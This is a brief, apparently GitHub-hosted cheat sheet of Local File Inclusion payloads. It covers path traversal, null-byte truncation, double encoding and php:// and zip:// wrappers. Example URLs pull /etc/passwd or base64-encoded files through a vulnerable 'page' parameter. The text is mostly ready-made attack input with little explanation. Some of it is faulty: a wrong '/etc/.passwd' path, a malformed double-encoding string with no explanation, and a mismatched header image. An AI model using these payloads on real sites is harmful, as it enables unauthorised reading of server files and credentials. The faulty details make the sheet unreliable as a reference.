# LFI (Local File Inclusion)

<img src="https://github.com/Asthral/CheatSheetTool/blob/main/Schema/File%20Uploads/file-upload-sheetcheatschema.png">



## 1. Classique

**Explanation :** We use the variable "page" for include an other file. And ../ its for going to the front folder. 

**Example :** http://www.exemple.com/?page=example.php

http://www.exemple.com/?page=../../../etc/.passwd


## 2. Null byte

**Explanation :** .php was incremented automaticaly, like lang=eng, so we use %00 for separate the extension added. 

**Exemple :** http://www.exemple.com/?page=photo

http://www.exemple.com/?page=../../../etc/passwd%00


## 3. Double encoding

**Explanation :**

**Exemple :** http://www.exemple.com/?page=%252E%252E%252F%252E%252E%252F%252Epasswd


## 4. Wrappers

**Explanation :** wrapper is for apply filter. We have :

phar://

zip://

**Example :** zip://tmp/file.zip%23shell.php

tar://

php://

**Exemple :** http://www.exemple.com/?page=/etc/.passwd (permission denied)

http://www.exemple.com/?page= php://filter/convert.base64-encode/resource=/etc/.passwd
